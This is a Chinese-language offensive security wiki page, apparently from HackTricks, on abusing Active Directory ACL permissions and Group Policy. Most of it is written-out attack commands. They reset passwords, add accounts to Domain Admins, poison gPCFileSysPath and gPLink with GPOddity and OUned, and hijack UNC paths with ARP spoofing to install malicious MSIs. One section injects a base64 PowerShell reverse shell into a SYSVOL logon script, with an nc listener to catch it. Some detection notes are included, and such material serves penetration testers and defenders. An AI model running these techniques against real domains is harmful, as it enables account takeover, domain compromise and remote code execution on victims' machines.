# 滥用 Active Directory ACL/ACE

{{#include ../../../banners/hacktricks-training.md}}

**本页面主要总结了以下文章中的技术：** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **以及** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**。更多详情请参阅原文。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **对用户拥有 GenericAll 权限**

此权限可让攻击者完全控制目标用户帐户。使用 `Get-ObjectAcl` 命令确认拥有 `GenericAll` 权限后，攻击者可以：

- **更改目标用户的密码**：使用 `net user <username> <password> /domain`，攻击者可以重置该用户的密码。
- 在 Linux 上，可以通过 Samba `net rpc` 使用 SAMR 执行相同操作：<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **如果账户已禁用，清除 UAC 标志**：`GenericAll` 允许编辑 `userAccountControl`。在 Linux 上，可使用 BloodyAD 移除 `ACCOUNTDISABLE` 标志：<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**：为用户账户分配 SPN，使其可进行 Kerberoast；然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解票据授予票据（TGT）哈希。

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**：为该用户禁用预身份验证，使其账户容易受到 ASREPRoasting 攻击。

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**：如果对某个用户拥有 `GenericAll` 权限，你可以添加基于证书的凭据，并以该用户身份进行身份验证，而无需更改其密码。参见：

{{#ref}}
shadow-credentials.md
{{#endref}}

## **对组拥有 GenericAll 权限**

如果攻击者对某个组（例如 `Domain Admins`）拥有 `GenericAll` 权限，就可以操纵组成员身份。使用 `Get-NetGroup` 确定该组的 distinguished name 后，攻击者可以：

- **将自己添加到 Domain Admins 组**：可以通过直接命令完成，也可以使用 Active Directory 或 PowerSploit 等模块。

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- 在 Linux 中，如果你对任意组拥有 GenericAll/Write 成员关系权限，也可以利用 BloodyAD 将自己添加到这些组中。如果目标组嵌套在 “Remote Management Users” 中，你将立即获得遵循该组配置的主机上的 WinRM 访问权限：<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **计算机/用户上的 GenericAll / GenericWrite / Write**

在计算机对象或用户账户上拥有这些权限，可以：

- **Kerberos Resource-based Constrained Delegation**：接管计算机对象。
- **Shadow Credentials**：利用创建 shadow credentials 的权限，冒充计算机或用户账户。

## 将对象移入继承 OU 权限的范围

即使某个主体最初无法修改账户的敏感属性，也可以通过组合**移动账户的权限**和**从目标 OU 继承的写入权限**来达成目的。验证源对象的移动权限以及目标 OU 上的 `CreateChild` 权限，移动对象，然后重新检查其有效 DACL。例如，powerview.py 的 `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` 可移动用户；随后，拥有该 OU 上继承的 `GenericWrite` 权限的受控组即可添加一个 [shadow credential](shadow-credentials.md)。移动对象本身不会创建继承权限。<sup>[[18]](#references)</sup>

如果你对某个 OU 拥有 `GenericAll`，但没有合适的继承 ACE，可以运行 `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>`，为其后代添加 ACE。请单独测试目标账户：**受 AdminSDHolder 保护的账户会禁用继承**，因此 OU ACE 可能对普通用户生效，却无法影响受保护用户。请参阅 [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group)。<sup>[[18]](#references)</sup>

另一种滥用路径是：特权计划清理脚本根据攻击者可影响的 ACE 选择 OU，然后对其后代运行 `Set-ADObject -Clear adminCount` **和** `$acl.SetAccessRuleProtection($False, $False)`。如果你可以修改 OU DACL，就向脚本检查的组授予所需的 `ExtendedRight` 或 `GenericAll` ACE；同时还需单独确认你能否触发该任务。随后，特权任务可以为先前受保护的账户恢复继承，使 OU ACE 得以生效。请确认具体脚本、触发权限和最终 DACL；仅清除 `adminCount` 并不会重新启用继承，而且仍属于受保护组的账户可能会被 SDProp 再次保护。<sup>[[18]](#references)</sup>

## **组上的 WriteProperty**

如果用户对某个特定组（例如 `Domain Admins`）的所有对象都拥有 `WriteProperty` 权限，就可以：

- **将自己添加到 Domain Admins 组**：结合使用 `net user` 和 `Add-NetGroupUser` 命令即可实现，从而在域内提升权限。

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self（组上的自成员关系）**

此权限使攻击者能够通过直接操作组成员身份的命令，将自己添加到特定组（例如 `Domain Admins`）中。使用以下命令序列即可将自己添加到组中：

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty（自我成员资格）**

类似的权限允许攻击者在对组拥有 `WriteProperty` 权限时，通过修改组属性将自己直接添加到组中。可通过以下方式确认并执行此操作：

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

在用户对象上持有 `User-Force-Change-Password` 的 `ExtendedRight`，即可在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具验证并利用此权限，有多种方法可重置用户密码，包括交互式会话和适用于非交互环境的单行命令。这些命令涵盖简单的 PowerShell 调用以及在 Linux 上使用 `rpcclient`，展示了攻击途径的多样性。

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **组上的 WriteOwner**

如果攻击者发现自己对某个组拥有 `WriteOwner` 权限，就可以将该组的所有者改为自己。当目标组是 `Domain Admins` 时，这尤其有影响，因为更改所有者可以更广泛地控制组属性和成员资格。此过程包括使用 `Get-ObjectAcl` 找到正确的对象，然后使用 `Set-DomainObjectOwner` 按 SID 或名称修改所有者。

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **用户上的 GenericWrite**

此权限允许攻击者修改用户属性。具体来说，拥有 `GenericWrite` 访问权限后，攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。攻击者可使用 `Set-ADObject` 命令，将目标用户的 `scriptpath` 属性更新为指向攻击者的脚本。

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

较窄的 `WriteProperty` ACE（作用范围限定为用户的 [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e)）可能就足够；不需要 `GenericWrite`。将该属性权限与域的 `SYSVOL\<domain>\scripts` 或 `NETLOGON` 目录树下可写的脚本结合起来，然后评估目标用户是否可能登录并访问该脚本。脚本会在该用户的上下文中于登录时运行。请分别检查实际生效的 AD ACL 和文件/共享 ACL；仅有匹配的 Allow ACE 或可写目录，并不能证明完整路径可行。

## **Group 上的 GenericWrite**

利用此权限，攻击者可以操纵组成员身份，例如将自己或其他用户添加到特定组。此过程包括创建凭据对象，使用该对象向组中添加或移除用户，并通过 PowerShell 命令验证成员身份变更。

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- 在 Linux 上，如果你对该组拥有 `GenericWrite` 权限，Samba `net` 可用于添加或移除成员（在无法使用 PowerShell/RSAT 时很有用）：<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

拥有 AD 对象并对其具有 `WriteDACL` 权限，可使攻击者为自己授予该对象的 `GenericAll` 权限。通过操纵 ADSI 即可实现这一点，从而完全控制该对象并修改其组成员身份。尽管如此，使用 Active Directory 模块的 `Set-Acl` / `Get-Acl` cmdlet 利用这些权限时仍存在限制。<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner 快速接管（PowerView）

当你对用户或服务帐户拥有 `WriteOwner` 和 `WriteDacl` 权限时，无需知道旧密码，即可使用 PowerView 完全控制该帐户并重置其密码：

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

注意：
- 如果你只有 `WriteOwner` 权限，可能需要先将所有者更改为自己：

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- 密码重置后，使用任意协议（SMB/LDAP/RDP/WinRM）验证访问权限。

## **域复制（DCSync）**

DCSync 攻击利用域上的特定复制权限，模拟 Domain Controller 并同步数据，包括用户凭据。这种强大的技术需要 `DS-Replication-Get-Changes` 等权限，使攻击者无需直接访问 Domain Controller 即可提取 AD 环境中的敏感信息。<sup>[[5]](#references)</sup> [**在此了解有关 DCSync 攻击的更多信息。**](../dcsync.md)

## GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 委派

委派的 Group Policy Objects (GPO) 管理访问权限可能带来显著的安全风险。例如，如果用户（如 `offense\spotless`）被委派了 GPO 管理权限，他们可能拥有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等权限。这些权限可能被用于恶意目的，可通过 PowerView 识别：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### 枚举 GPO 权限

要识别配置错误的 GPO，可以串联使用 PowerSploit 的 cmdlet。这样可以发现特定用户有权管理的 GPO：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**应用了指定策略的计算机**：可以解析特定 GPO 适用的计算机，从而了解潜在影响范围。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用于指定计算机的策略**：要查看应用于特定计算机的策略，可以使用 `Get-DomainGPO` 等命令。

**应用了指定策略的 OU**：可以使用 `Get-DomainOU` 查找受指定策略影响的组织单位 (OU)。

你也可以使用工具 [**GPOHound**](https://github.com/cogiceo/GPOHound) 枚举 GPO 并查找其中的问题。

### 滥用 GPO - New-GPOImmediateTask

配置错误的 GPO 可被利用来执行代码，例如创建即时计划任务。通过这种方式，可以将用户添加到受影响计算机的本地管理员组，从而大幅提升权限：

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

如果已安装 GroupPolicy module，就可以创建并链接新的 GPO，并设置注册表值等首选项，以便在受影响的计算机上执行后门。此方法需要更新 GPO，并且需要用户登录计算机才能执行：

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - 滥用 GPO

SharpGPOAbuse 提供了一种滥用现有 GPO 的方法：通过添加任务或修改设置来实现，无需创建新的 GPO。此工具需要修改现有 GPO，或先使用 RSAT 工具创建新的 GPO，然后再应用更改：

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### 强制更新策略

GPO 通常每隔约 90 分钟更新一次。若要加快这一过程，尤其是在实施更改后，可以在目标计算机上运行 `gpupdate /force` 命令，强制立即更新策略。这样无需等待下一次自动更新周期，即可应用对 GPO 所做的修改。

### 深入了解

检查某个 GPO（例如 `Misconfigured Policy`）的计划任务时，可以确认其中已添加 `evilTask` 等任务。这些任务通过脚本或命令行工具创建，旨在修改系统行为或提升权限。

`New-GPOImmediateTask` 生成的 XML 配置文件展示了任务的结构，列明计划任务的具体内容，包括要执行的命令及其触发条件。该文件体现了如何在 GPO 中定义和管理计划任务，并提供了在策略强制执行过程中运行任意命令或脚本的方法。

### 用户和组

GPO 还允许操纵目标系统上的用户和组成员关系。通过直接编辑 Users and Groups 策略文件，攻击者可以将用户添加到特权组，例如本地 `administrators` 组。若被授予 GPO 管理权限，攻击者便可修改策略文件，添加新用户或更改组成员关系。

Users and Groups 的 XML 配置文件说明了如何实施这些更改。向该文件添加条目，即可在受影响的系统上向特定用户授予提升后的权限。这种方法可通过操纵 GPO 直接提升权限。

对于本地组成员关系和用户权限等安全设置，还应检查已应用的 GPO 模板 `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` 以及 `SecEdit` 目录的 ACL。目录或文件可写只是进一步审查的线索；更改能否生效，仍取决于实际的 SYSVOL 共享访问权限、拒绝权限和继承的 ACL、组策略容器权限、策略作用范围以及客户端刷新情况。仅仅属于名为 “GPO Managers” 的组，并不能证明拥有编辑权限。[Microsoft 文档介绍了此模板路径，以及组策略容器与模板之间的分离关系。](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

此外，还可以考虑其他代码执行或维持持久化的方法，例如利用登录/注销脚本、修改用于自动运行的注册表项、通过 .msi 文件安装软件，或编辑服务配置。这些技术提供了多种途径，可通过滥用 GPO 维持访问并控制目标系统。

### 将 GPC/GPT 检索重定向到经过身份验证的恶意服务

GPO 由 LDAP **组策略容器 (GPC)**（包含元数据）和托管在 SMB 上的 **组策略模板 (GPT)**（包含策略文件）组成。刷新期间，客户端会遵循容器的 `gPLink`，读取所引用的 GPC 及其 `gPCFileSysPath`，然后从该 UNC 路径下载 GPT。因此，获得 GPC 本身或 OU、Site 或 Domain 的 `gPLink` 的写入权限，都可能导致特权策略处理。<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### 使用 GPOddity 投毒 `gPCFileSysPath`

如果受控主体可以写入目标 GPC（直接写入，或通过 **NTLM relay to LDAP**），就可以将 `gPCFileSysPath` 替换为攻击者托管的 UNC 路径。[GPOddity](https://github.com/synacktiv/GPOddity) 可自动完成 LDAP 修改，并提供恶意 GPT，其中包含基于模块的策略文件或 Immediate Task；Group Policy 客户端会以 `NT AUTHORITY\SYSTEM` 身份执行该任务。<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

在当前的 Windows 客户端上，匿名 SMB 共享或不验证凭据的 SMB 共享并不足够：SMB Secure Negotiate 要求证明身份验证已成功，因此恶意服务必须验证域身份、派生 SMB 会话密钥，并正确签署响应。在嵌入模式下，使用受控的计算机帐户及其服务密钥配置 GPOddity，然后在 `[COMMANDS]` 部分选择计算机端或用户端载荷。<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**用户 GPO 边缘情况：**在 MS16-072 之后，Windows 仍会在**同一个 TCP 连接**中创建两个 SMB2 会话：用户会话读取 `GPT.INI`，随后计算机账户会话读取生效配置，例如 `ScheduledTasks.xml`。因此，恶意服务器必须按 SMB2 `SessionId` 索引身份验证状态、会话密钥和签名密钥，而不能仅按套接字索引。嵌入 GPOddity/OUned 的 Scapy 分支通过 `SMBStreamSocketMultiplexing` 和支持多路复用的 `SMBServer` 实现了此功能；单会话 Impacket/Scapy 服务器会重复使用错误的签名状态，导致用户策略处理失败。<sup>[[15]](#references)</sup>

#### 使用 OUned 进行 `gPLink` poisoning

如果攻击者对 OU、Site 或 Domain 具有 `WriteGPLink`、`GenericWrite` 或等效控制权限，就可以追加一个链接，其 GPC DN 由攻击者控制的 LDAP 主机提供。Petros Koutroumpis 最初介绍了这一原语；[OUned](https://github.com/synacktiv/OUned) 可自动完成 LDAP 写入以及恶意 GPC/GPT 链。<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

受害者首先向恶意 LDAP 服务进行身份验证，并收到一个 `gPCFileSysPath` 指向恶意 SMB 服务的 GPC；随后它会向 SMB 进行身份验证并应用提供的 GPT。因此，OUned 需要一个具有 LDAP SPN 的账户、一个具有 HOST SPN 的机器账户以供 SMB 使用（同一个机器账户可以同时满足这两项要求），以及 DNS 解析或反向转发，将端口 389 和 445 的流量发送到操作者主机。<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned 内嵌的 Scapy LDAP server 使用真实的受控服务密钥验证 Kerberos/SPNEGO，并从 JSON 提供任意 GPC 数据。空 JSON 键用于模拟 rootDSE，`base64:` 前缀表示二进制值；该 server 支持 add/delete/modify/search，以及 `BASE`、`LEVEL` 和 `SUBTREE` 搜索；它可以协商无保护、完整性保护或机密性保护。当其他 Windows 组件遵循攻击者控制的 LDAP 引用、但要求 LDAP 经过身份验证时，这使该服务可以重复使用。<sup>[[15]](#references)</sup>

不要假设将账户密码同步到虚拟域就能复现所有 Kerberos 密钥：RC4 是根据密码派生的，而 AES string-to-key 还会使用根据主体 hostname/domain 派生的 salt。向 `KerberosSSP` 提供实际账户 AES 密钥，可以避免通过对机器账户可自行写入的 `msDS-SupportedEncryptionTypes` 做容易被检测到的更改，来强制使用 RC4。<sup>[[15]](#references)</sup>

#### 检测切入点

将对 `gPCFileSysPath` 或 `gPLink` 的更改与 GPO 版本更改及新增的 Immediate/Scheduled Task XML 关联起来。调查指向意外命名上下文的链接、指向已批准 DC/SYSVOL 集合以外的 UNC 主机、重定向机器账户名称的 DNS 记录、针对异常机器账户的 LDAP/CIFS 服务票据，以及启用 RC4 的 `msDS-SupportedEncryptionTypes` 更改。<sup>[[15]](#references)</sup>

### WriteGPLink + UNC 路径劫持（ARP 欺骗）

通过 OU/domain 上的 `WriteGPLink`，你可以修改目标容器的 `gPLink` 属性，并**强制应用现有 GPO**，而无需编辑 GPO 本身。当已链接的 GPO 引用了通过 **UNC 路径**（`\\HOST\share\...`）访问的远程内容时，这种做法就很有意思，因为经过身份验证的用户可以读取 **SYSVOL**，并离线搜寻可重复利用的策略。<sup>[[11]](#references)</sup>

高层工作流程：

1. 使用 BloodHound 找出对某个 OU 具有 `WriteGPLink` 权限的主体，并枚举该 OU 中的计算机/用户。
2. 以只读方式克隆 `SYSVOL`，并解析 GPO，查找引用 UNC 路径的 **Software Installation**、**驱动器映射**（`Drives.xml`）以及**登录/启动脚本**。
3. 优先选择指向**直接 hostname** 的策略（例如 `\\DC02\share\pkg.msi`），而不是 DFS/domain-namespace 路径，因为基于 hostname 的路径更容易通过 L2 spoofing 重定向。
4. 将所选 GPO GUID 添加到目标 OU 的 `gPLink`，使受害者处理该现有策略。
5. 在同一广播域中，对 UNC 主机进行 ARP spoof，并在本机绑定其 IP（`ip addr add <target_ip>/32 dev <iface>`），使受害者的 SMB 流量到达你的主机。
6. 在攻击者的 SMB server（例如 `smbserver.py`）上提供预期路径/文件名，然后等待策略正常处理。

`SYSVOL` 收集和 GPO 关联示例：

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

将现有 GPO 链接到目标 OU：

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC 劫持 -> SYSTEM

如果链接的 GPO 从 UNC 路径部署 MSI，客户端会在**计算机启动**时获取该文件，并以 **`NT AUTHORITY\SYSTEM`** 身份安装。通过 spoof 被引用的主机，并在**相同的共享/路径/文件名**下提供恶意 MSI，你就可以将 `WriteGPLink` 变成 SYSTEM 代码执行，**无需修改 SYSVOL**。

重要限制：

- **时机很重要**：新链接会在策略刷新时被发现（通常约 90 分钟），但 **Software Installation** 通常会在**重启**时触发。
- Windows Installer 通常会使用软件包的 **`ProductCode`** 跟踪部署。如果产品已经安装，可能会跳过部署。
- 为避免安装程序拒绝安装，请修补恶意 MSI，使其 **`ProductCode`** 和 **`PackageCode`** 与 GPO 预期的合法软件包匹配。
- 旧的 `.aas` 广告文件可能仍留在 `SYSVOL` 中，因此在依赖此方法前，请确认该部署仍处于活动状态。

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### 驱动器映射 UNC 劫持 -> NTLM 捕获 / WebDAV 中继

GPP 驱动器映射会在用户登录或重新连接时，使用户向 `Drives.xml` 中配置的 UNC 路径进行身份验证。如果你伪造被引用的主机，就可以捕获 **NetNTLMv2**。如果故意让 SMB 连接失败，Windows 可能会改用 **WebDAV** 重试，并通过 **HTTP** 发送 **NTLM**，这使其更容易中继到 **LDAP(S)**、**AD CS** 或 **SMB**。

#### 登录/启动脚本 UNC 劫持

同样的模式也适用于在 `SYSVOL` 中发现的、托管于 UNC 路径的脚本：

- **登录脚本**通常在**用户**上下文中执行。
- **启动脚本**通常在**计算机 / SYSTEM** 上下文中执行。

如果脚本路径指向一个可伪造的主机名，就将 UNC 主机重定向，并从预期位置提供替换脚本内容。

## SYSVOL/NETLOGON 登录脚本投毒

`\\<dc>\SYSVOL\<domain>\scripts\` 或 `\\<dc>\NETLOGON\` 下的可写路径允许篡改通过 GPO 在用户登录时执行的登录脚本。这会在登录用户的安全上下文中实现代码执行。

### 定位登录脚本
- 检查用户属性中是否配置了登录脚本：

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- 遍历域共享目录，查找快捷方式或脚本引用：

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- 解析 `.lnk` 文件，查找指向 SYSVOL/NETLOGON 的目标（这是一种实用的 DFIR 技巧，也适用于无法直接访问 GPO 的攻击者）：

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound 会在用户对象存在 `scriptPath` 登录脚本属性时显示该属性。通过 GPO 配置的登录脚本属于单独的策略引用，因此也要检查适用的 GPO。

### 验证写入权限（不要轻信共享列表）
即使确切脚本具有不同的 NTFS ACL，自动化工具也可能将 SYSVOL/NETLOGON 显示为只读。先以只读方式检查该文件及其父目录；匹配的 Allow ACE 仍只是候选项，因为有效的 SMB 和 NTFS 权限、Deny ACE 以及当前令牌都会产生影响：

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

经过授权的写入测试应针对特定目标，并且可逆；应备份并恢复原始脚本。不要仅为测试访问权限而覆盖正在使用的登录脚本；写入成功后，脚本可能会在下一位用户登录时运行。

### 向 VBScript 登录脚本注入代码以实现 RCE
追加一条启动 PowerShell reverse shell 的命令（从 revshells.com 生成），并保留原有逻辑，以免破坏业务功能：

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

在你的主机上监听，并等待下一次交互式登录：

```bash
rlwrap -cAr nc -lnvp 443
```

说明：
- 执行时使用日志记录用户的令牌（而非 SYSTEM）。作用范围是应用该脚本的 GPO 链接（OU、站点或域）。
- 使用后，通过恢复原始内容/时间戳进行清理。


## References

- [1] [滥用 Active Directory ACL/ACE](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [特权帐户和令牌特权](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL 攻击路径更新](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights 枚举 - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [使用 Active Directory 中的 ACL 提升权限](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [扫描 Active Directory 权限和特权帐户](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule 构造函数 - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – 在 Linux 上执行 AD 属性/UAC 操作](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc（组成员关系）](https://www.samba.org/)
- [10] [HTB Puppy：AD ACL 滥用、KeePassXC Argon2 破解及 DPAPI 解密以获取 DC 管理员权限](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP 周边探查：劫持 GPO UNC 路径以执行代码并进行 NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity：通过 NTLM Relay 等方式利用 Active Directory GPO](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU 在开玩笑吗？- Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py：利用 Active Directory 中隐藏的组织单位 ACL 攻击向量](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [在网络上模拟合法的 Active Directory 服务：GPO 利用案例](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
